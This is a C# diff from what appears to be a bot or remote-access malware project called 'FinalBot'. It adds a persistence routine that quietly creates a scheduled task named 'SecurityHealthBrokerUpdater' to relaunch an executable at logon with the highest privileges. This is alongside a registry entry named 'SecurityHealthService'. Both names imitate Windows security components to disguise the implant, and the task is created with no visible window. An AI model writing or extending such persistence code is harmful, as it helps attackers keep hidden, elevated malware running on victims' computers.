@@ -34,14 +34,28 @@ namespace FinalBot
                     key?.SetValue("SecurityHealthService", $"\"{targetPath}\"");
                 }
 
-                // 3. Native Vanguard Persistence (if available)
-                // try { PersistManager.RegisterStartup(targetPath); } catch { }
+                // 3. Scheduled Task Persistence
+                try
+                {
+                    var proc = new Process
+                    {
+                        StartInfo = new ProcessStartInfo
+                        {
+                            FileName = "schtasks",
+                            Arguments = $"/create /tn \"SecurityHealthBrokerUpdater\" /tr \"'{targetPath}'\" /sc onlogon /rl highest /f",
+                            UseShellExecute = false,
+                            CreateNoWindow = true
+                        }
+                    };
+                    proc.Start();
+                }
+                catch { }
 
-                Console.WriteLine("[PERSISTENCE] Installed successfully.");
+                Logger.Info("[PERSISTENCE] Installed successfully via Registry and Schtasks.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[PERSISTENCE ERROR] {ex.Message}");
+                Logger.Error("Persistence installation failed", ex);
             }
         }
 
